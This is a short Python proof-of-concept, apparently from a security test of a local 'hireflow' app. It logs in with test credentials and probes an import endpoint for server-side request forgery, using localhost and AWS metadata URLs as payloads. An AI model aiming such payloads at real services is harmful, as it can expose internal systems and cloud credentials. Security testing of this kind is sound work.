"""
WSTG-INPV-19: Server-Side Request Forgery — Profile Import
Demonstrates that the /api/integrations/import endpoint accepts arbitrary URLs,
enabling SSRF attacks via profile import functionality.
Expected: Request to internal host returns error (but confirms SSRF capability)
"""
import requests

BASE = "http://localhost:3000"

# Login to get valid token
login = requests.post(f"{BASE}/api/auth/login", json={
    "email": "testclient@hireflow.com",
    "password": "password123"
})
token = login.json()["token"]

# Step 1: Try to access internal service via import endpoint
print("Testing SSRF via profile import against internal service...")
resp = requests.get(
    f"{BASE}/api/integrations/import",
    params={"url": "http://127.0.0.1:80"},
    headers={"Authorization": f"Bearer {token}"}
)
print(f"Status: {resp.status_code}")
print(f"Response: {resp.json()}")

# Step 2: Try AWS metadata endpoint
print("\nTesting SSRF via profile import against AWS metadata...")
resp = requests.get(
    f"{BASE}/api/integrations/import",
    params={"url": "http://169.254.169.254/latest/meta-data/"},
    headers={"Authorization": f"Bearer {token}"}
)
print(f"Status: {resp.status_code}")
print(f"Response: {resp.json()}")

print("\n[VULNERABLE] SSRF confirmed via profile import endpoint")
print("Application makes outbound requests to attacker-controlled URLs")
